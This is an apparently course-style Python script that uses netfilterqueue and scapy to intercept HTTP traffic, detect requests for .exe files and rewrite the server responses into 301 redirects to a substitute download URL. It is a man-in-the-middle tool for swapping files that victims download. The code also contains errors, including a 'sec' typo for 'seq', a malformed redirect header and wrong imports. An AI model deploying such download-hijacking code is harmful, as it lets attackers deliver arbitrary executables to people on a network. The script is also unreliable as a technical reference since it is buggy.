#!/usr/bin/env python3
import netfilterqueue
from scapy.layers.inet import IP, TCP
from scapy.layers.dns import Raw

ack_list = []


def process_packet(packet):
    # Convert the packet we are passes as an argument to a scapy packet
    scapy_packet = IP(packet.get_payload())
    # If our new scapy packet has a Raw (HTTP) layer and a TCP layer, move on
    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
        # Look for a HTTP Request in our packet, a transmission on port 80
        if scapy_packet[TCP].dport == 80:
            print("HTTP Request: ")
            if ".exe" in scapy_packet[Raw].load:
                # Does not work with https, which is all sites now
                print("[+] Exe Request: ")
                # get the acknowledgement (ack) reference of the request.
                ack_list.append(scapy_packet[TCP].ack)
                print(scapy_packet.show())
                # manually initiate TCP handshake
                # some code here to replace the code
        # Look for a HTTP Response in our packet, on port 80 (HTTP Port)
        elif scapy_packet[TCP].sport == 80:
            print("HTTP Response: ")
            # Look for the sequence of the current response is in the ack list
            if scapy_packet[TCP].sec in ack_list:
                # remove the sequence from our acknowledgement list to prevent clutter and conflicts
                ack_list.remove(scapy_packet[TCP].seq)
                print("[+] Replacing File: ")
                # Use http 301 Moved permanently to redirect the packet
                # Put 2 new line characters at end of string to differentiate buggy clutter in redirection
                scapy_packet[Raw].load = "301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n"
                # We modified the packet so scapy needs to recalculate the following, so we delete them.
                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[TCP].chksum
                # pass our scapy_packet variable to the packet
                # after converting it to a string
                packet.set_payload(str(scapy_packet))
                return packet

    packet.accept()
    return None  # suppress excess packets being printed.


if __name__ == "__main__":
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()